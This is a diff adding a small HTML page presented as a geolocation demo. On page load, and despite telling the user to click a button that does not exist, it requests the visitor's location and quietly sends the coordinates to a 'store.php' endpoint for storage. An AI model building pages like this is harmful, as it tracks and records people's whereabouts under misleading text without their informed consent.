@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body  onload="getLocation()">
+<h1>HTML Geolocation</h1>
+<p>Click the button to get your coordinates.</p>
+
+
+<p id="demo"></p>
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(success, error);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function success(position) {
+     const xhttp = new XMLHttpRequest();
+     xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+     xhttp.send();
+
+}
+
+function error() {
+  alert("Sorry, no position available.");
+}
+</script>
+
+</body>
+</html>
+
